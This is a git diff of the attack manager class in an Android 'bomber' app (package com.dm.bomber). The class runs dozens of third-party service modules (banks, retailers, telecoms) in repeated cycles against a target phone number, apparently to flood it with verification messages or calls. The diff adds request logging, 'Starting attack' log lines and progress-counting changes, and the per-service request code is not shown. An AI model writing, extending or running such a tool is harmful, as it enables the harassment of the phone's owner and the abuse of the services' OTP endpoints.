@@ -2,6 +2,8 @@ package com.dm.bomber;
 
 import android.util.Log;
 
+import androidx.annotation.NonNull;
+
 import com.dm.bomber.services.ABank24;
 import com.dm.bomber.services.Alltime;
 import com.dm.bomber.services.Askona;
@@ -30,13 +32,13 @@ import com.dm.bomber.services.ICQ;
 import com.dm.bomber.services.Kari;
 import com.dm.bomber.services.KazanExpress;
 import com.dm.bomber.services.Lenta;
-import com.dm.bomber.services.Magnit;
+import com.dm.bomber.services.MFC;
 import com.dm.bomber.services.MTS;
+import com.dm.bomber.services.Magnit;
 import com.dm.bomber.services.Mcdonalds;
 import com.dm.bomber.services.MegaDisk;
 import com.dm.bomber.services.MegafonBank;
 import com.dm.bomber.services.MegafonTV;
-import com.dm.bomber.services.MFC;
 import com.dm.bomber.services.Modulebank;
 import com.dm.bomber.services.Mokka;
 import com.dm.bomber.services.Multiplex;
@@ -85,10 +87,11 @@ import java.io.IOException;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.concurrent.CountDownLatch;
-import java.util.concurrent.TimeUnit;
 
 import okhttp3.Call;
+import okhttp3.Interceptor;
 import okhttp3.OkHttpClient;
+import okhttp3.Request;
 import okhttp3.Response;
 
 public class AttackManager {
@@ -101,8 +104,20 @@ public class AttackManager {
 
     public AttackManager(Callback callback) {
         Service.client = new OkHttpClient.Builder()
-                // .callTimeout(7, TimeUnit.SECONDS)
-                .build();
+                .addInterceptor(new Interceptor() {
+                    @NonNull
+                    @Override
+                    public Response intercept(@NonNull Chain chain) throws IOException {
+                        Request request = chain.request();
+                        Log.v(TAG, String.format("Sending request %s", request.url()));
+
+                        Response response = chain.proceed(request);
+                        Log.v(TAG, String.format("Received response for %s with status code %s",
+                                response.request().url(), response.code()));
+
+                        return response;
+                    }
+                }).build();
 
         this.callback = callback;
         this.services = new Service[]{
@@ -183,33 +198,33 @@ public class AttackManager {
             List<Service> usableServices = getUsableServices(phoneCode);
 
             callback.onAttackStart(usableServices.size(), numberOfCycles);
+            Log.i(TAG, String.format("Starting attack on +%s%s", phoneCode, phone));
 
             for (int cycle = 0; cycle < numberOfCycles; cycle++) {
+                Log.i(TAG, String.format("Started cycle %s", cycle));
+
                 tasks = new CountDownLatch(usableServices.size());
 
                 for (Service service : usableServices) {
                     service.prepare(phoneCode, phone);
-
                     service.run(new okhttp3.Callback() {
                         @Override
                         public void onFailure(@NotNull Call call, @NotNull IOException e) {
-                            progress++;
-                            tasks.countDown();
+                            Log.e(TAG, String.format("%s returned error", service.getClass().getName()), e);
 
-                            Log.e(TAG, service.getClass().getName());
-                            e.printStackTrace();
+                            tasks.countDown();
+                            callback.onProgressChange(progress++);
                         }
 
                         @Override
                         public void onResponse(@NotNull Call call, @NotNull Response response) {
                             if (!response.isSuccessful()) {
-                                Log.i(TAG, service.getClass().getName() + "  returned an error HTTP code: " + response.code());
+                                Log.i(TAG, String.format("%s returned an error HTTP code: %s",
+                                        service.getClass().getName(), response.code()));
                             }
 
-                            progress++;
                             tasks.countDown();
-
-                            callback.onProgressChange(progress);
+                            callback.onProgressChange(progress++);
                         }
                     });
                 }
@@ -222,6 +237,7 @@ public class AttackManager {
             }
 
             callback.onAttackEnd();
+            Log.i(TAG, String.format("Attack on +%s%s ended", phoneCode, phone));
         }
     }
 }
